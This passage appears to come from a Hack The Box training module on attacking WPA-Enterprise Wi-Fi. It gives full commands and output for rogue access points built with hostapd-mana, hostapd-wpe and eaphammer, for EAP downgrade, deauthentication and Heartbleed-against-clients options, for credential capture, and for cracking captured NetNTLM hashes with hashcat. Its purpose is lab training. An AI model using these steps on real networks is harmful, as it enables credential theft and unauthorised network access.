An optional company name []:

```

We should ensure that the information in our new x509 certificate matches the details from the previous certificate, as this will make our attack appear more legitimate. Additionally, the challenge password used should match the one specified in the .eap\_user file. Finally, we need to generate the x509 certificate for the server. This can be done with the following command:

```shell
openssl x509 -req -days 100 -set_serial 01 -in server-key.pem -out server.pem -CA ca.pem -CAkey ca-key.pem

Certificate request self-signature ok
subject=C=US, ST=California, L=San Fransisco, O=Hack The Box, OU=HTB, CN=HTB, [email protected]

```

At this point, we are ready to execute our attack. We should have our certificates, configuration files, and other necessary resources prepared. To bring up our fake access point, we can use the following command:

```shell
hostapd-mana hostapd.conf

Configuration file: hostapd.conf
MANA: Captured credentials will be written to file 'credentials.creds'.
rfkill: Cannot open RFKILL control device
Using interface wlan1 with hwaddr 00:11:22:33:44:00 and ssid "HTB-Corp"
random: Only 18/20 bytes of strong random data available from /dev/random
random: Not enough entropy pool available for secure operations
WPA: Not enough entropy in random pool for secure operations - update keys later when the first station connects
wlan1: interface state UNINITIALIZED->ENABLED
wlan1: AP-ENABLED

```

If everything is set up correctly, our access point should be operational and ready to capture credentials from client devices. To observe our access point in action and monitor the connectivity of client devices, we can start an `airodump-ng` session in a second terminal.

```shell
airodump-ng wlan0mon -c 1

 CH  1 ][ Elapsed: 6 s ][ 2024-08-23 09:47

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 00:11:22:33:44:00  -28 100       97        0    0   1   54   WPA2 CCMP   MGT  HTB-Corp
 9C:9A:03:39:BD:7A  -28 100       97        5    0   1   54   WPA2 CCMP   MGT  HTB-Corp

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

 9C:9A:03:39:BD:7A  16:C5:68:79:A8:12  -29   12 -54      0        4

```

From the airodump-ng output, we can see that our fake access point, named HTB-Corp, has been successfully created. Now, we need to wait for clients to connect to our network.

If, after some time, connected clients do not automatically switch to our network due to the KARMA attack (and they remain associated with the original access point in our airodump-ng session), we may need to perform a `deauthentication attack`. This will disconnect clients from the target access point, encouraging them to connect to our fake AP. We can execute this attack using the following command, specifying the target access point's BSSID and the client’s MAC address.

```shell
sudo aireplay-ng -0 6 -a 9C:9A:03:39:BD:7A -c 16:C5:68:79:A8:12 wlan0mon

09:57:49  Waiting for beacon frame (BSSID: 9C:9A:03:39:BD:7A) on channel 1
09:57:49  Sending 64 directed DeAuth (code 7). STMAC: [16:C5:68:79:A8:12] [ 0| 0 ACKs]
09:57:50  Sending 64 directed DeAuth (code 7). STMAC: [16:C5:68:79:A8:12] [ 0| 0 ACKs]
09:57:50  Sending 64 directed DeAuth (code 7). STMAC: [16:C5:68:79:A8:12] [ 0| 0 ACKs]

```

Once a client successfully connects to our fake access point and EAP negotiation is successful, we should observe output similar to the following in the `hostapd-mana` tab:

```shell
wlan1: AP-ENABLED
MANA - Directed probe request for SSID 'HTB-Corp' from 16:C5:68:79:A8:12
MANA - Directed probe request for SSID 'HTB-Corp' from 16:C5:68:79:A8:12
wlan1: STA 16:C5:68:79:A8:12 IEEE 802.11: authenticated
wlan1: STA 16:C5:68:79:A8:12 IEEE 802.11: associated (aid 1)
wlan1: CTRL-EVENT-EAP-STARTED 16:C5:68:79:A8:12
wlan1: CTRL-EVENT-EAP-PROPOSED-METHOD vendor=0 method=1
MANA EAP Identity Phase 0: HTB\Sentinal
wlan1: CTRL-EVENT-EAP-PROPOSED-METHOD vendor=0 method=21
wlan1: CTRL-EVENT-EAP-PROPOSED-METHOD vendor=0 method=25
MANA EAP Identity Phase 1: HTB\Sentinal
MANA EAP GTC | HTB\\Sentinal:<SNIP>
wlan1: CTRL-EVENT-EAP-SUCCESS 16:C5:68:79:A8:12
wlan1: STA 16:C5:68:79:A8:12 WPA: pairwise key handshake completed (RSN)
wlan1: AP-STA-CONNECTED 16:C5:68:79:A8:12
wlan1: STA 16:C5:68:79:A8:12 RADIUS: starting accounting session 71E68D59FDAE5701
wlan1: STA 16:C5:68:79:A8:12 IEEE 802.1X: authenticated - EAP type: 0 (unknown)

```

In this example, the client accepted the `EAP GTC` method and connected to our access point.

During the EAP authentication process, the client disclosed its identity and password, as it would in a typical scenario. Since `EAP GTC` is a weaker standard, we are able to retrieve the cleartext credentials. If our attack was running for a while and we missed this prompt, we can also check our credential output file for the information, as shown below:

```shell
cat credentials.creds

[EAP GTC]      HTB\\Sentinal:<SNIP>

```

Our credential file will not only capture cleartext credentials, but also hashes that may be captured. Not all devices are susceptible to `GTC` or `TTLS-PAP vectors`, and as such they may output different credentials when they connect to our fake access point. However, not all devices are equal in their security, and as such we should be able to capture credentials in these cases. With this said, it is always important to do ample reconnaissance before employing an enterprise evil-twin attack. As the better the information we gather, the better our attack will turn out.

## Using Eaphammer

We can also perform the downgrade attack using [eaphammer](https://github.com/s0lst1c3/eaphammer). This powerful tool automates the entire process for us.

First, we need to create self-signed certificates that eaphammer will use to set up our fake access point. This can be done using the `--cert-wizard` command.

```shell
/opt/eaphammer/eaphammer --cert-wizard

                     .__
  ____ _____  ______ |  |__ _____    _____   _____   ___________
_/ __ \\__  \ \____ \|  |  \\__  \  /     \ /     \_/ __ \_  __ \
\  ___/ / __ \|  |_> >   Y  \/ __ \|  Y Y  \  Y Y  \  ___/|  | \/
 \___  >____  /   __/|___|  (____  /__|_|  /__|_|  /\___  >__|
     \/     \/|__|        \/     \/      \/      \/     \/

                        Now with more fast travel than a next-gen Bethesda game. >:D

                             Version:  1.14.0
                            Codename:  Final Frontier
                              Author:  @s0lst1c3
                             Contact:  gabriel<<at>>transmitengage.com


[?] Am I root?
[*] Checking for rootness...
[*] I AM ROOOOOOOOOOOOT
[*] Root privs confirmed! 8D
[*] Please enter two letter country code for certs (i.e. US, FR)
: US
[*] Please enter state or province for certs (i.e. Ontario, New Jersey)
: California
[*] Please enter locale for certs (i.e. London, Hong Kong)
: San Fransisco
[*] Please enter organization for certs (i.e. Evil Corp)
: Hack The Box
[*] Please enter org unit for certs (i.e. Hooman Resource Says)
: HTB
[*] Please enter email for certs (i.e. [email protected])
: [email protected]
[*] Please enter common name (CN) for certs.
: HTB
[CW] Creating CA cert and key pair...
[CW] Complete!
[CW] Writing CA cert and key pair to disk...
[CW] New CA cert and private key written to: /opt/eaphammer/certs/ca/HTB.pem
[CW] Complete!
[CW] Creating server private key...
[CW] Complete!
[CW] Using server private key to create CSR...
[CW] Complete!
[CW] Creating server cert using CSR and signing it with CA key...
[CW] Complete!
[CW] Writing server cert and key pair to disk...
[CW] Complete!
[CW] Activating full certificate chain...
[CW] Complete!

```

Once our self-signed certificates are created, we can use the following command to start our fake access point. Initially, we can set `--negotiate balanced`, which makes eaphammer first attempt to downgrade to GTC and then immediately fallback to stronger EAP methods if the downgrade fails. This balanced approach is designed to maximize impact while minimizing the risk of prolonged EAP negotiations. If this fails, we can use `--negotiate weakest` to perform a full EAP downgrade attack. For more details on using eaphammer, visit [eaphammer usage](https://github.com/s0lst1c3/eaphammer/wiki/VIII.-Attacking-WPA-EAP-and-WPA2-EAP-Networks#viii2---controlling-eap-negotiation-eap-downgrade-attacks).

```shell
/opt/eaphammer/eaphammer --interface wlan1 --negotiate balanced --auth wpa-eap --essid HTB-Corp --creds

                     .__
  ____ _____  ______ |  |__ _____    _____   _____   ___________
_/ __ \\__  \ \____ \|  |  \\__  \  /     \ /     \_/ __ \_  __ \
\  ___/ / __ \|  |_> >   Y  \/ __ \|  Y Y  \  Y Y  \  ___/|  | \/
 \___  >____  /   __/|___|  (____  /__|_|  /__|_|  /\___  >__|
     \/     \/|__|        \/     \/      \/      \/     \/

                        Now with more fast travel than a next-gen Bethesda game. >:D

                             Version:  1.14.0
                            Codename:  Final Frontier
                              Author:  @s0lst1c3
                             Contact:  gabriel<<at>>transmitengage.com


[?] Am I root?
[*] Checking for rootness...
[*] I AM ROOOOOOOOOOOOT
[*] Root privs confirmed! 8D
[*] Saving current iptables configuration...
sh: 1: iptables-save: not found
[*] Reticulating radio frequency splines...

[*] Using nmcli to tell NetworkManager not to manage wlan1...

100%|████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 1/1 [00:01<00:00,  1.00s/it]

[*] Success: wlan1 no longer controlled by NetworkManager.
[*] WPA handshakes will be saved to /opt/eaphammer/loot/wpa_handshake_capture-2024-08-23-09-47-06-AB8Sdxpezkg9DQL1DeuuD55VbEV8lQ2b.hccapx

[hostapd] AP starting...

Configuration file: /opt/eaphammer/tmp/hostapd-2024-08-23-09-47-06-sxNw9HntaNSwMGby2IzWMzbSFstIQ9lN.conf
rfkill: Cannot open RFKILL control device
wlan1: interface state UNINITIALIZED->COUNTRY_UPDATE
Using interface wlan1 with hwaddr 00:11:22:33:44:00 and ssid "HTB-Corp"
random: Only 17/20 bytes of strong random data available
random: Not enough entropy pool available for secure operations
WPA: Not enough entropy in random pool for secure operations - update keys later when the first station connects
wlan1: interface state COUNTRY_UPDATE->ENABLED
wlan1: AP-ENABLED

```

This command will start our fake `WPA-EAP` access point with the SSID as `HTB-Corp`. We then need to wait for clients to connect to our network. If, after some time, clients do not automatically switch to our network, we may need to perform a deauthentication attack. This will disconnect clients from the target access point, encouraging them to connect to our fake AP. We can execute this attack using the following command, specifying both the target access point's BSSID and the client’s MAC address.

```shell
sudo aireplay-ng -0 3 -a 9C:9A:03:39:BD:7A -c 16:C5:68:79:A8:12 wlan0mon

09:47:53  Waiting for beacon frame (BSSID: 9C:9A:03:39:BD:7A) on channel 1
09:47:53  Sending 64 directed DeAuth (code 7). STMAC: [16:C5:68:79:A8:12] [ 0| 0 ACKs]
09:47:54  Sending 64 directed DeAuth (code 7). STMAC: [16:C5:68:79:A8:12] [ 0| 0 ACKs]
09:47:54  Sending 64 directed DeAuth (code 7). STMAC: [16:C5:68:79:A8:12] [ 0| 0 ACKs]

```

Once a client successfully connects to our fake access point and EAP negotiation is successful, we should observe output similar to the following:

```shell
wlan1: STA 16:C5:68:79:A8:12 IEEE 802.11: authenticated
wlan1: STA 16:C5:68:79:A8:12 IEEE 802.11: associated (aid 1)
wlan1: CTRL-EVENT-EAP-STARTED 16:C5:68:79:A8:12
wlan1: CTRL-EVENT-EAP-PROPOSED-METHOD vendor=0 method=1
wlan1: CTRL-EVENT-EAP-PROPOSED-METHOD vendor=0 method=25

mschapv2: Fri Aug 23 09:47:56 2024
	 domain\username:		HTB\Sentinal
	 username:			Sentinal
	 challenge:			26:4b:fc:a6:dc:b1:56:94
	 response:			65:cb:56:62:49:64:41:5a:d7:07:9b:cf:a6:53:23:0d:39:f8:28:b8:c3:25:0c:df

	 jtr NETNTLM:			Sentinal:$NETNTLM$264bfcb6dcb15694$65cb56624964415ad7079bcfa653230d39f828b8c3250cdf

	 hashcat NETNTLM:		Sentinal::::65cb56b24964415ad7079bcfa653230d39f828b8c3250cdf:264bfcb6dcb15694

OpenSSL: EVP_DigestInit_ex failed: error:0308010C:digital envelope routines::unsupported
wlan1: CTRL-EVENT-EAP-FAILURE 16:C5:68:79:A8:12
wlan1: STA 16:C5:68:79:A8:12 IEEE 802.1X: authentication failed - EAP type: 0 (unknown)
wlan1: STA 16:C5:68:79:A8:12 IEEE 802.1X: Supplicant used different EAP type: 25 (PEAP)
wlan1: STA 16:C5:68:79:A8:12 IEEE 802.11: deauthenticated due to local deauth request
wlan1: STA 16:C5:68:79:A8:12 IEEE 802.11: authenticated
wlan1: STA 16:C5:68:79:A8:12 IEEE 802.11: associated (aid 1)
wlan1: CTRL-EVENT-EAP-STARTED 16:C5:68:79:A8:12
wlan1: CTRL-EVENT-EAP-PROPOSED-METHOD vendor=0 method=1
wlan1: CTRL-EVENT-EAP-PROPOSED-METHOD vendor=0 method=25

GTC: Fri Aug 23 09:48:16 2024
	 username:	HTB\Sentinal
	 password:	<SNIP>
wlan1: CTRL-EVENT-EAP-FAILURE 16:C5:68:79:A8:12
wlan1: STA 16:C5:68:79:A8:12 IEEE 802.1X: authentication failed - EAP type: 0 (unknown)
wlan1: STA 16:C5:68:79:A8:12 IEEE 802.1X: Supplicant used different EAP type: 25 (PEAP)
wlan1: STA 16:C5:68:79:A8:12 IEEE 802.11: deauthenticated due to local deauth request
wlan1: STA 16:C5:68:79:A8:12 IEEE 802.11: authenticated
wlan1: STA 16:C5:68:79:A8:12 IEEE 802.11: associated (aid 1)
wlan1: CTRL-EVENT-EAP-STARTED 16:C5:68:79:A8:12
wlan1: CTRL-EVENT-EAP-PROPOSED-METHOD vendor=0 method=1
wlan1: CTRL-EVENT-EAP-PROPOSED-METHOD vendor=0 method=25

```

On the first attempt, this process will provide us with an NTLM hash. On the second attempt, it will connect using GTC and provide us with cleartext credentials.

With the obtained clear-text credentials, we can now connect to the target enterprise Wi-Fi network as the identified user.

![image](https://academy.hackthebox.com/storage/modules/282/Enterprise/downgrade_auth_.PNG)

We configure the authentication type as `Protected EAP (PEAP)` and set the inner authentication to `MSCHAPv2`. After adding the username and password, we tick the option: `No CA certificate is required` (since we are not using certificate-based authentication.) Once we hit connect, we will successfully gain access to the enterprise Wi-Fi network.


# Enterprise Evil-Twin Attack

* * *

In the previous section, we explored how to perform EAP downgrade attack to force clients into weaker authentication methods. However, if certain client devices resist downgrading to a sufficiently weak standard, we won't be able to carry out that attack. In these scenarios, when the client devices use challenge-response-based authentication methods like `CHAP`, `MSCHAP`, or `MSCHAPv2`, we can employ a traditional approach. This involves setting up an enterprise evil-twin attack by creating a fake access point (Rogue AP) to capture the challenge hash, which can then be leveraged for further exploitation.

A scenario where the authenticator sends a challenge, and the supplicant (applicant) encrypts it with a password before sending it back for verification, is known as a challenge-response-based authentication method.

* * *

## Enumeration

We begin by enabling monitor mode on our `wlan0` interface using `airmon-ng`.

```shell
sudo airmon-ng start wlan0

Found 2 processes that could cause trouble.
Kill them using 'airmon-ng check kill' before putting
the card in monitor mode, they will interfere by changing channels
and sometimes putting the interface back in managed mode

    PID Name
    559 NetworkManager
    798 wpa_supplicant

PHY     Interface       Driver          Chipset

phy0    wlan0           rt2800usb       Ralink Technology, Corp. RT2870/RT3070
                (mac80211 monitor mode vif enabled for [phy0]wlan0 on [phy0]wlan0mon)
                (mac80211 station mode vif disabled for [phy0]wlan0)

```

```shell
airodump-ng wlan0mon -c 1

 CH  1 ][ Elapsed: 6 s ][ 2024-08-23 09:47

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 9C:9A:03:39:BD:7A  -28 100       97        5    0   1   54   WPA2 CCMP   MGT  HTB-Corp

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

 9C:9A:03:39:BD:7A  7E:0E:08:8F:6E:60  -29   12 -54      0        4

```

* * *

## Performing the Attack

We'll explore two ways to perform this attack. The first method involves using `hostapd-wpe`, where we manually create self-signed certificates and set up the access point. The second method utilizes the `eaphammer` tool, which automates the entire process for us.

* * *

### Using HostAPD-wpe

[HostAPD-wpe](https://github.com/aircrack-ng/aircrack-ng/tree/master/patches/wpe/hostapd-wpe) is a versatile utility for attacking WPA/WPA2 Enterprise networks, handling most of the configuration for us with minimal interference. It is effective for impersonating the following EAP types:

- `EAP-FAST/MSCHAPv2 (Phase 0)`
- `PEAP/MSCHAPv2`
- `EAP-TTLS/MSCHAPv2`
- `EAP-TTLS/MSCHAP`
- `EAP-TTLS/CHAP`
- `EAP-TTLS/PAP`

To begin, we will want to make a copy of our configuration file for `HostAPD-wpe`.

```shell
cp /etc/hostapd-wpe/hostapd-wpe.conf hostapd-wpe.conf
ls

hostapd-wpe.conf

```

Next, we need to modify specific sections of our `hostapd-wpe.conf` configuration file to ensure our tool functions as desired. We need to change the interface to `wlan1`, set the SSID to `HTB-Corp`, and configure the channel to `1`.

```configuration
interface=wlan1
ssid=HTB-Corp
channel=1

```

`HostAPD-wpe` includes functionality for the heartbleed vulnerability, and in some cases, we can utilize this against client devices who use SSL certificates to authenticate to the network.

```shell
hostapd-wpe

hostapd-WPE v2.10
User space daemon for IEEE 802.11 AP management,
IEEE 802.1X/WPA/WPA2/EAP/RADIUS Authenticator
Copyright (c) 2002-2022, Jouni Malinen <[email protected]> and contributors
-----------------------------------------------------
WPE (Wireless Pwnage Edition)
<snip>
WPE options:
   -r   Return Success where possible
   -c   Cupid Mode (Heartbleed clients)
   -k   Karma Mode (Respond to all probes)
   Note: credentials logging is always enabled

```

Once our interface is set up, and our `hostapd-wpe.conf` file is properly configured, we can use following the command to launch the attack. We specify `-c` for Cupid mode (which attempts to Heartbleed any clients), `-k` for Karma mode (so that all probes are responded to), and finally, the path to our configuration file.

```shell
sudo hostapd-wpe -c -k hostapd-wpe.conf

rfkill: Cannot open RFKILL control device
random: Only 15/20 bytes of strong random data available
random: Not enough entropy pool available for secure operations
WPA: Not enough entropy in random pool for secure operations - update keys later when the first station connects
wlan1: interface state UNINITIALIZED->ENABLED
wlan1: AP-ENABLED

```

If everything is set up correctly, our access point should be operational and ready to capture credentials from client devices. To observe our access point in action and monitor the connectivity of client devices, we can start an `airodump-ng` session in a second terminal.

```shell
airodump-ng wlan0mon -c 1

 CH  1 ][ Elapsed: 6 s ][ 2024-08-23 09:47

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 00:11:22:33:44:00  -28 100       97        0    0   1   54   WPA2 CCMP   MGT  HTB-Corp
 9C:9A:03:39:BD:7A  -28 100       97        5    0   1   54   WPA2 CCMP   MGT  HTB-Corp

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

 9C:9A:03:39:BD:7A  7E:0E:08:8F:6E:60  -29   12 -54      0        4

```

If, after some time, connected clients do not automatically switch to our network and remain associated with the original AP, we may need to perform a `deauthentication attack`. This will disconnect clients from the target access point, encouraging them to connect to our fake AP. We can execute this attack using the following command, specifying the target access point's BSSID and the client's MAC address.

```shell
sudo aireplay-ng -0 10 -a 9C:9A:03:39:BD:7A -c 7E:0E:08:8F:6E:60 wlan0mon

12:52:30  Waiting for beacon frame (BSSID: 9C:9A:03:39:BD:7A) on channel 1
12:52:30  Sending 64 directed DeAuth (code 7). STMAC: [7E:0E:08:8F:6E:60] [ 0| 0 ACKs]
12:52:31  Sending 64 directed DeAuth (code 7). STMAC: [7E:0E:08:8F:6E:60] [ 0| 0 ACKs]
12:52:31  Sending 64 directed DeAuth (code 7). STMAC: [7E:0E:08:8F:6E:60] [ 0| 0 ACKs]
12:52:32  Sending 64 directed DeAuth (code 7). STMAC: [7E:0E:08:8F:6E:60] [ 0| 0 ACKs]
12:52:32  Sending 64 directed DeAuth (code 7). STMAC: [7E:0E:08:8F:6E:60] [ 0| 0 ACKs]
12:52:33  Sending 64 directed DeAuth (code 7). STMAC: [7E:0E:08:8F:6E:60] [ 0| 0 ACKs]
12:52:33  Sending 64 directed DeAuth (code 7). STMAC: [7E:0E:08:8F:6E:60] [ 0| 0 ACKs]
12:52:34  Sending 64 directed DeAuth (code 7). STMAC: [7E:0E:08:8F:6E:60] [ 0| 0 ACKs]
12:52:34  Sending 64 directed DeAuth (code 7). STMAC: [7E:0E:08:8F:6E:60] [ 0| 0 ACKs]
12:52:35  Sending 64 directed DeAuth (code 7). STMAC: [7E:0E:08:8F:6E:60] [ 0| 0 ACKs]

```

Once a client successfully connects to our fake access point and EAP negotiation is completed, we should see output similar to the following in the `hostapd-mana` tab:

```shell
wlan1: STA 7e:0e:08:8f:6e:60 IEEE 802.11: authenticated
wlan1: STA 7e:0e:08:8f:6e:60 IEEE 802.11: associated (aid 1)
wlan1: CTRL-EVENT-EAP-STARTED 7e:0e:08:8f:6e:60
wlan1: CTRL-EVENT-EAP-PROPOSED-METHOD vendor=0 method=1
wlan1: CTRL-EVENT-EAP-PROPOSED-METHOD vendor=0 method=25
wlan1: STA 7e:0e:08:8f:6e:60 IEEE 802.1X: Identity received from STA: 'HTB-NET\Administrator'
wlan1: STA 7e:0e:08:8f:6e:60 IEEE 802.1X: Identity received from STA: 'HTB-NET\Administrator'
OpenSSL: openssl_handshake - SSL_connect error:1408F10B:SSL routines:SSL3_GET_RECORD:wrong version number
wlan1: CTRL-EVENT-EAP-FAILURE 7e:0e:08:8f:6e:60
wlan1: STA 7e:0e:08:8f:6e:60 IEEE 802.1X: authentication failed - EAP type: 0 (unknown)
wlan1: STA 7e:0e:08:8f:6e:60 IEEE 802.1X: Supplicant used different EAP type: 25 (PEAP)
wlan1: STA 7e:0e:08:8f:6e:60 IEEE 802.11: deauthenticated due to local deauth request
wlan1: STA 7e:0e:08:8f:6e:60 IEEE 802.11: authenticated
wlan1: STA 7e:0e:08:8f:6e:60 IEEE 802.11: associated (aid 1)
wlan1: CTRL-EVENT-EAP-STARTED 7e:0e:08:8f:6e:60
wlan1: CTRL-EVENT-EAP-PROPOSED-METHOD vendor=0 method=1
wlan1: CTRL-EVENT-EAP-PROPOSED-METHOD vendor=0 method=25
wlan1: STA 7e:0e:08:8f:6e:60 IEEE 802.1X: Identity received from STA: 'HTB-NET\Administrator'
wlan1: STA 7e:0e:08:8f:6e:60 IEEE 802.1X: Identity received from STA: 'HTB-NET\Administrator'
wlan1: STA 7e:0e:08:8f:6e:60 IEEE 802.1X: Identity received from STA: 'HTB-NET\Administrator'
wlan1: STA 7e:0e:08:8f:6e:60 IEEE 802.1X: Identity received from STA: 'HTB-NET\Administrator'
wlan1: STA 7e:0e:08:8f:6e:60 IEEE 802.1X: Identity received from STA: 'HTB-NET\Administrator'
wlan1: STA 7e:0e:08:8f:6e:60 IEEE 802.1X: Identity received from STA: 'HTB-NET\Administrator'

mschapv2: Wed Aug 21 12:52:31 2024
	 username:			HTB-NET\Administrator
	 challenge:			45:14:53:22:49:08:8c:58
	 response:			10:51:1c:55:42:d6:04:1d:b2:2a:d6:29:73:ad:76:0c:6f:f5:07:d3:3a:dd:6d:b3
	 jtr NETNTLM:			Administrator:$NETNTLM$as65a4sd564d1a2s$54as56d65asasd55asd564asd564asd555asd564as6d55s5
	 hashcat NETNTLM:		Administrator::::54as56d65asasd55asd564asd564asd555asd564as6d55s5:as65a4sd564d1a2s

wlan1: STA 7e:0e:08:8f:6e:60 IEEE 802.1X: Identity received from STA: 'HTB-NET\Administrator'
wlan1: STA 7e:0e:08:8f:6e:60 IEEE 802.1X: Identity received from STA: 'HTB-NET\Administrator'
wlan1: CTRL-EVENT-EAP-FAILURE 7e:0e:08:8f:6e:60
wlan1: STA 7e:0e:08:8f:6e:60 IEEE 802.1X: authentication failed - EAP type: 0 (unknown)
wlan1: STA 7e:0e:08:8f:6e:60 IEEE 802.1X: Supplicant used different EAP type: 25 (PEAP)
wlan1: STA 7e:0e:08:8f:6e:60 IEEE 802.11: deauthenticated due to local deauth request

```

When a client initially connects to our fake access point, `hostapd-wpe` will attempt to retrieve the `MSCHAPv2` hash from the client to "authenticate" it. An example of a successful retrieval is shown above. Since this is not inherently a downgrade attack, we do not negotiate `EAP-PEAP/GTC`, which would allow us to obtain cleartext passwords if the client is vulnerable. Therefore, we will need to crack the `MSCHAPv2` hash to retrieve the correct password. Given that we rely on user passwords, the effectiveness of our attack will be contingent on the strength of the password policy in place.

* * *

## Using Eaphammer

We can also perform this attack using `eaphammer`. This powerful tool automates the entire process for us.

First, we need to create self-signed certificates that eaphammer will use to set up our fake access point. This can be done using the `--cert-wizard` option in eaphammer.

```shell
/opt/eaphammer/eaphammer --cert-wizard

                     .__
  ____ _____  ______ |  |__ _____    _____   _____   ___________
_/ __ \\__  \ \____ \|  |  \\__  \  /     \ /     \_/ __ \_  __ \
\  ___/ / __ \|  |_> >   Y  \/ __ \|  Y Y  \  Y Y  \  ___/|  | \/
 \___  >____  /   __/|___|  (____  /__|_|  /__|_|  /\___  >__|
     \/     \/|__|        \/     \/      \/      \/     \/

                        Now with more fast travel than a next-gen Bethesda game. >:D

                             Version:  1.14.0
                            Codename:  Final Frontier
                              Author:  @s0lst1c3
                             Contact:  gabriel<<at>>transmitengage.com


[?] Am I root?
[*] Checking for rootness...
[*] I AM ROOOOOOOOOOOOT
[*] Root privs confirmed! 8D
[*] Please enter two letter country code for certs (i.e. US, FR)
: US
[*] Please enter state or province for certs (i.e. Ontario, New Jersey)
: California
[*] Please enter locale for certs (i.e. London, Hong Kong)
: San Fransisco
[*] Please enter organization for certs (i.e. Evil Corp)
: Hack The Box
[*] Please enter org unit for certs (i.e. Hooman Resource Says)
: HTB
[*] Please enter email for certs (i.e. [email protected])
: [email protected]
[*] Please enter common name (CN) for certs.
: HTB
[CW] Creating CA cert and key pair...
[CW] Complete!
[CW] Writing CA cert and key pair to disk...
[CW] New CA cert and private key written to: /opt/eaphammer/certs/ca/HTB.pem
[CW] Complete!
[CW] Creating server private key...
[CW] Complete!
[CW] Using server private key to create CSR...
[CW] Complete!
[CW] Creating server cert using CSR and signing it with CA key...
[CW] Complete!
[CW] Writing server cert and key pair to disk...
[CW] Complete!
[CW] Activating full certificate chain...
[CW] Complete!

```

Once our self-signed certificates are created, we can use the following command to start our fake access point.

```shell
/opt/eaphammer/eaphammer -i wlan1 -e HTB-Corp --auth wpa-eap --wpa-version 2

                     .__
  ____ _____  ______ |  |__ _____    _____   _____   ___________
_/ __ \\__  \ \____ \|  |  \\__  \  /     \ /     \_/ __ \_  __ \
\  ___/ / __ \|  |_> >   Y  \/ __ \|  Y Y  \  Y Y  \  ___/|  | \/
 \___  >____  /   __/|___|  (____  /__|_|  /__|_|  /\___  >__|
     \/     \/|__|        \/     \/      \/      \/     \/

                        Now with more fast travel than a next-gen Bethesda game. >:D

                             Version:  1.14.0
                            Codename:  Final Frontier
                              Author:  @s0lst1c3
                             Contact:  gabriel<<at>>transmitengage.com


[?] Am I root?
[*] Checking for rootness...
[*] I AM ROOOOOOOOOOOOT
[*] Root privs confirmed! 8D
[*] Saving current iptables configuration...
sh: 1: iptables-save: not found
[*] Reticulating radio frequency splines...

[*] Using nmcli to tell NetworkManager not to manage wlan1...

100%|███████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 1/1 [00:01<00:00,  1.00s/it]

[*] Success: wlan1 no longer controlled by NetworkManager.
[*] WPA handshakes will be saved to /opt/eaphammer/loot/wpa_handshake_capture-2024-08-24-20-06-58-IfQcjy8aUxQMOYngbBz9ptekIBPa1eN1.hccapx

[hostapd] AP starting...

Configuration file: /opt/eaphammer/tmp/hostapd-2024-08-24-20-06-58-Sdjimacw2CCEPAo41y3LQaDdX2EBiURW.conf
rfkill: Cannot open RFKILL control device
wlan1: interface state UNINITIALIZED->COUNTRY_UPDATE
Using interface wlan1 with hwaddr 00:11:22:33:44:00 and ssid "HTB-Corp"
random: Only 19/20 bytes of strong random data available
random: Not enough entropy pool available for secure operations
WPA: Not enough entropy in random pool for secure operations - update keys later when the first station connects
wlan1: interface state COUNTRY_UPDATE->ENABLED
wlan1: AP-ENABLED

```

This command will start our fake `WPA-EAP` access point with the SSID as `HTB-Corp`. We then need to wait for clients to connect to our network. If, after some time, clients do not automatically switch to our network due to the KARMA attack and remain associated with the original access point in our airodump-ng session, we may need to perform a deauthentication attack. This will disconnect clients from the target access point, encouraging them to connect to our fake AP. We can execute this attack using the following command, specifying both the target access point's BSSID and the client’s MAC address.

```shell
sudo aireplay-ng -0 10 -a 9C:9A:03:39:BD:7A -c 7E:0E:08:8F:6E:60 wlan0mon

20:07:21  Waiting for beacon frame (BSSID: 9C:9A:03:39:BD:7A) on channel 1
20:07:21  Sending 64 directed DeAuth (code 7). STMAC: [7E:0E:08:8F:6E:60] [ 0| 0 ACKs]
20:07:21  Sending 64 directed DeAuth (code 7). STMAC: [7E:0E:08:8F:6E:60] [ 0| 0 ACKs]
20:07:22  Sending 64 directed DeAuth (code 7). STMAC: [7E:0E:08:8F:6E:60] [ 0| 0 ACKs]
20:07:22  Sending 64 directed DeAuth (code 7). STMAC: [7E:0E:08:8F:6E:60] [ 0| 0 ACKs]
20:07:23  Sending 64 directed DeAuth (code 7). STMAC: [7E:0E:08:8F:6E:60] [ 0| 0 ACKs]

```

Once a client successfully connects to our fake access point and EAP negotiation is successful, we should observe output similar to the following:

```shell
wlan1: STA 7e:0e:08:8f:6e:60 IEEE 802.11: authenticated
wlan1: STA 7e:0e:08:8f:6e:60 IEEE 802.11: associated (aid 1)
wlan1: CTRL-EVENT-EAP-STARTED 7e:0e:08:8f:6e:60
wlan1: CTRL-EVENT-EAP-PROPOSED-METHOD vendor=0 method=1
wlan1: CTRL-EVENT-EAP-PROPOSED-METHOD vendor=0 method=25

mschapv2: Sat Aug 24 20:07:21 2024
	 domain\username:		HTB-NET\Administrator
	 username:		    	Administrator
	 challenge:		    	45:14:53:22:49:08:8c:58
	 response:		    	10:51:1c:55:42:d6:04:1d:b2:2a:d6:29:73:ad:76:0c:6f:f5:07:d3:3a:dd:6d:b3
	 jtr NETNTLM:			Administrator:$NETNTLM$as65a4sd564d1a2s$54as56d65asasd55asd564asd564asd555asd564as6d55s5
	 hashcat NETNTLM:		Administrator::::54as56d65asasd55asd564asd564asd555asd564as6d55s5:as65a4sd564d1a2s

```

* * *

## Cracking the Hash

To begin our attempt at cracking the hash (in order to gain access to our target access point), we need to choose a suitable wordlist, which may include our end user's password. Once we have located the desired wordlist, we can employ the following command to run a password cracking attack against our captured hash. We specify `-m 5500` for the correct [hash mode](https://hashcat.net/wiki/doku.php?id=example_hashes), `-a 0` for the attack mode, our captured `NetNTLM` hash in Hashcat format, and finally, the dictionary file we will attempt cracking with.

```shell
hashcat -m 5500 -a 0 HTB-NET\Administrator::::54as56d65asasd55asd564asd564asd555asd564as6d55s5:as65a4sd564d1a2s wordlist.dict

<snip>

HTB-NET\Administrator::::54as56d65asasd55asd564asd564asd555asd564as6d55s5:as65a4sd564d1a2s:Wowwhatasecurepassword123

Session..........: hashcat
Status...........: Cracked
